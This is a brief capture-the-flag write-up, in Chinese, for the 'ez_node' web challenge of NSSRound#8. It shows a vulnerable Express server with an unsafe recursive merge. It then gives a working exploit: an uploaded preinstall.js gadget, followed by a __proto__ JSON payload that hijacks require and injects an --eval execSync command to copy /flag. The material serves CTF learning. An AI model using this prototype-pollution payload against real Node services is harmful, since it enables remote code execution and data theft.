# NSSRound#8 Basic


## web

### ez_node
原型链污染
server.js
```javascript
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const PORT = process.env.port || 3000
const app = express();

global = "global"

app.listen(PORT, () => {
    console.log(`listen at ${PORT}`);
});

function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}


let objMulter = multer({ dest: "./upload" });
app.use(objMulter.any());

app.use(express.static("./public"));

app.post("/upload", (req, res) => {
    try{
        let oldName = req.files[0].path;
        let newName = req.files[0].path + path.parse(req.files[0].originalname).ext;
        fs.renameSync(oldName, newName);
        res.send({
            err: 0,
            url:
            "./upload/" +
            req.files[0].filename +
            path.parse(req.files[0].originalname).ext
        });
    }
    catch(error){
        res.send(require('./err.js').getRandomErr())
    }
});

app.post('/pollution', require('body-parser').json(), (req, res) => {
    let data = {};
    try{
        merge(data, req.body);
        res.send('Register successfully!tql')
        require('./err.js').getRandomErr()
    }
    catch(error){
        res.send(require('./err.js').getRandomErr())
    }
})
```
[https://l1nyz-tel.cc/2023/2/11/NSSCTF-Round-8-web/](https://l1nyz-tel.cc/2023/2/11/NSSCTF-Round-8-web/)
merge存在原型链污染，再加上`require('./err.js')`
preinstall.js
```javascript
if (process.env.npm_config_global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');

    try {
        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
            encoding: 'utf8',
            stdio: ['ignore', undefined, 'ignore'],
        }).replace(/\n/g, '');

        var manifest = require('./package.json');
        var binNames = typeof manifest.bin === 'string'
            ? [manifest.name.replace(/^@[^\/]+\//, '')]
            : typeof manifest.bin === 'object' && manifest.bin !== null
            ? Object.keys(manifest.bin)
            : [];

        binNames.forEach(function (binName) {
            var binPath = path.join(targetPath, binName);

            var binTarget;
            try {
                binTarget = fs.readlinkSync(binPath);
            } catch (err) {
                return;
            }

            if (binTarget.startsWith('../lib/node_modules/pmm/')) {
                try {
                    fs.unlinkSync(binPath);
                } catch (err) {
                    return;
                }
            }
        });
    } catch (err) {
        // ignore errors
    }
}
```
先上传 preinstall.js，得到路径 ./upload/67ca744f2a2ff94cf82c51bd93540365.js
再污染原型链，得到flag
```javascript
{
    "__proto__": {
        "data": {
            "name": "./err.js",
            "exports": {
                ".": "./67ca744f2a2ff94cf82c51bd93540365.js"
            }
        },
        "path": "./upload",
        "npm_config_global": 1,
        "npm_execpath": "--eval=require('child_process').execSync('cp${IFS}/flag${IFS}/app/public/flag.html')"
    },
    "x": null
}
```

